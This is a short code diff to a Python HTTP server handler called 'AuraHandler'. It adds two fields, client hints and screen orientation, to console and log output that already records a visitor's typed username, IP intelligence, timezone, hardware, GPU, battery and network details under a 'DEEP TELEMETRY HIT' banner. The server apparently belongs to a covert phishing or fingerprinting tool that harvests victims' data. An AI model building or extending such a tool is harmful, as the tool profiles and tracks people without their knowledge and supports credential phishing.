@@ -100,6 +100,8 @@ class AuraHandler(http.server.SimpleHTTPRequestHandler):
                 print(f"{Colors.CYAN} ├── Input User  : {Colors.GREEN}{input_usr}{Colors.RESET}")
                 print(f"{Colors.CYAN} ├── IP Intel    : {Colors.WHITE}{ip_intel}{Colors.RESET}")
                 print(f"{Colors.CYAN} ├── Platform    : {Colors.WHITE}{body.get('platform')} (Lang: {body.get('lang')}){Colors.RESET}")
+                print(f"{Colors.CYAN} ├── Client Hints: {Colors.WHITE}{body.get('clientHints')}{Colors.RESET}")
+                print(f"{Colors.CYAN} ├── Orientation : {Colors.WHITE}{body.get('orientation')}{Colors.RESET}")
                 print(f"{Colors.CYAN} ├── Hardware    : {Colors.WHITE}{body.get('cores')} Cores | RAM: {body.get('ram')} GB{Colors.RESET}")
                 print(f"{Colors.CYAN} ├── Storage     : {Colors.WHITE}{body.get('storage')}{Colors.RESET}")
                 print(f"{Colors.CYAN} ├── Battery     : {Colors.WHITE}{body.get('battery')}{Colors.RESET}")
@@ -110,6 +112,8 @@ class AuraHandler(http.server.SimpleHTTPRequestHandler):
 [+] DEEP TELEMETRY HIT: {client_ip}
 Input Username: {input_usr}
 Platform: {body.get('platform')} | TZ: {body.get('tz')}
+Client Hints: {body.get('clientHints')}
+Orientation: {body.get('orientation')}
 Hardware: {body.get('cores')} Cores | RAM: {body.get('ram')} GB
 GPU: {body.get('gpu')}
 Battery: {body.get('battery')} | Net: {body.get('network')}
